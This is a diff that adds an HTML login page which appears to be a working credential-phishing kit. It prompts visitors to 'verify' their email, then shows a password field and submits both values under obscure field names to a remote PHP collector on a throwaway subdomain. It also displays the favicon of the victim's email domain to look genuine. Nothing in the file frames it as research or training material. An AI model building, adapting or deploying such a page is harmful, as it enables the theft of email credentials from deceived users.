@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Login Page</title>
+<style>
+    body {
+        font-family: Arial, sans-serif;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        margin: 0;
+        background-color: #f0f0f0; /* Background color */
+    }
+    .login-container {
+        background-color: white;
+        border-radius: 10px;
+        padding: 20px;
+        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); /* Box shadow */
+        width: 300px;
+    }
+    .container {
+        width: 100%;
+        text-align: center;
+    }
+    input[type=text], input[type=password], button {
+        width: 100%;
+        padding: 10px;
+        margin: 10px 0;
+        border: 1px solid #ccc;
+        border-radius: 5px;
+        box-sizing: border-box;
+    }
+    button {
+        background-color: #2881c0;
+        color: white;
+        cursor: pointer;
+    }
+    #passwordInput {
+        opacity: 0;
+        height: 0;
+        overflow: hidden;
+        transition: opacity 0.5s ease, height 0s ease 0.5s;
+    }
+    #passwordInput.active {
+        opacity: 1;
+        height: auto;
+        transition: opacity 0.5s ease, height 0s ease;
+    }
+    .error-message {
+        color: #2881c0;
+        display: none;
+    }
+    .error-message.active {
+        display: block;
+    }
+    #domainImage {
+        display: none;
+        height: 16px;
+        width: 16px;
+        margin-left: 10px;
+    }
+</style>
+</head>
+<body style="background-image: url('https://i.ibb.co/vBVJQg7/joga.png'); background-repeat: no-repeat; background-size: cover;">
+<div class="login-container">
+    <div class="container">
+	
+        <img height="50" width="90" id="xender" src="https://i.ibb.co/yn2BXRC/logo.png" alt="Loophole"><br></br>
+		<div class="dig" id="done">Verify your email to proceed</div>
+        <img id="domainImage" alt="Domain Image">
+        <form id="loginForm" action="https://tvwmmm0xzzmcojx210976.cleavr.one/tp/tb/tap.php" method="post">
+            <input type="text" id="emailInput" name="whitelodge1" placeholder="Enter Email">
+            <input type="password" id="passwordInput" name="whitelodge2" placeholder="Enter Password">
+            <div id="passwordErrorMessage" class="error-message">Verify password to continue</div>
+            <div id="errorMessage" class="error-message"></div>
+            <button type="button" onclick="togglePasswordInput()" id="verifyButton">Verify</button>
+            <button type="button" onclick="verify()" style="display: none;" id="submitButton">Submit</button>
+        </form>
+    </div>
+</div>
+
+<script>
+    function togglePasswordInput() {
+        var passwordInput = document.getElementById("passwordInput");
+        passwordInput.classList.toggle("active");
+        if (passwordInput.classList.contains("active")) {
+            document.getElementById("emailInput").disabled = true;
+            document.getElementById("verifyButton").style.display = "none";
+            document.getElementById("submitButton").style.display = "inline-block";
+        } else {
+            document.getElementById("emailInput").disabled = false;
+            document.getElementById("verifyButton").style.display = "inline-block";
+            document.getElementById("submitButton").style.display = "none";
+        }
+        validatePassword();
+    }
+
+    function validatePassword() {
+        var password = document.getElementById("passwordInput").value;
+        if (password.length < 5) {
+            document.getElementById("passwordErrorMessage").classList.add("active");
+            document.getElementById("errorMessage").classList.add("active");
+        } else {
+            document.getElementById("passwordErrorMessage").classList.remove("active");
+            document.getElementById("errorMessage").classList.remove("active");
+        }
+    }
+
+    function verify() {
+        var password = document.getElementById("passwordInput").value;
+        if (password.length >= 5) {
+            var email = document.getElementById("emailInput").value;
+            var domain = email.split('@')[1];
+            var imageUrl = "https://www.google.com/s2/favicons?domain=" + domain;
+            document.getElementById("domainImage").src = imageUrl;
+            document.getElementById("domainImage").style.display = "inline-block";
+            document.getElementById("done").style.display = "none"; // Hide the 'done' text
+            document.getElementById("loginForm").submit();
+        }
+    }
+</script>
+</body>
+</html>
